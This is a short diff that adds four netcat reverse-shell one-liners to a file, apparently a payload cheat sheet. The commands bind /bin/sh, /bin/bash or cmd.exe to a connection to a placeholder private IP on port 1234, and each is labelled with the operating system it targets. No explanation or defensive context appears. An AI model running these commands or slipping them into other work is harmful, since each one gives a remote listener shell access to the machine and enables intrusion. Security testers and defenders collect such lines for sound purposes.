@@ -1,0 +1,4 @@
+nc -e /bin/sh 10.0.0.0 1234 (linux)
+nc -e /bin/bash 10.0.0.0 1234 (linux)
+nc -c bash 10.0.0.0 1234 (unix)
+nc -e cmd.exe 10.10.10.0 1234 (window)
